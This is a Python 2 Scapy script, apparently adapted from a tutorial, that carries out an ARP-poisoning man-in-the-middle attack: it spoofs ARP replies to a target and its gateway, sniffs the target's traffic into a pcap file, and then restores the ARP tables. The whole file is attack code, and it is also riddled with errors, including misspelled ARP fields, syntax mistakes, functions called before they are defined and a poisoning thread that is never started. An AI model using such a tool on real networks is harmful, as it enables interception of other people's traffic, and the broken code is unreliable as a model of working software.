from scapy.all import * 
import os 
import threading 
import signal 

interface = "en1" #change this 
target_ip = "192.189.3.20" #change this
gateway_ip = "183.39.33.224" #change this
packet_count = "1000"

conf.iface = interface

conf.verb = 0 

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
	print "[!!] Failed to get gateway MAC. Exiting"
	sys.exit(0)

else:
	print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:

	print "[!!!] Failed to get target_ip, target_mac"
	sys.exit(0) 
else:
	print "[*] Target %s is at %s" % (target_mac,target_ip)

# start poison thread
try:
	print "[*] Starting sniffer for %d packets" % packet_count

	bpf_filter = "ip host %s" % target_ip
	packsts = sniff(count=packet_count,filter=bpf_filter,iface=interface)

	# write out the captured packets

	wrpcap('arper.pcap', packsts)

	# restore the network
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except keyboardInterrupt:
	# restore the network
	restore_target(gateway_ip,gateway_mac,target_ip,gateway_mac)
	sys.exit(0)

# attack the ARP
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

	# slightly different method using send
	print "[*] Restoring target ......"
	send(ARP(op=2, prs=gateway_ip, pds=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac)count=5)
	send(ARP(op=2, prs=target_ip, pds=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac)count=5)

	# signals the main thread to exit
	os.kill(os.getpid(), signal.SIGNIT)

def get_mac(ip_address):


	response,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

	# return the mac address from a response
	for s,r in response:
		return r[Ether].src 

		return None

# begin the attack
def posion_target(gateway_ip,gateway_mac,target_ip.target_mac):

	posion_target = ARP()
	posion_target.op = 2
	posion_target.prsc = gateway_ip
	posion_target.prdst = target_ip
	posion_target.hwdst = target_mac

	posion_gateway = ARP()
	posion_gateway.op = 2
	posion_gateway.prsc = target_ip
	posion_gateway.prdst = gateway_ip
	posion_gateway.hwsrc = gateway_mac

	print "[*] Beginning the ARP poison. [CTRL-C to Stop]"

	while True:
		try:
			send(posion_target)
			send(posion_gateway)

			time.sleep(2)
		except keyboardInterrupt:
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

		print "[*] ARP poison attack finished"
		return	
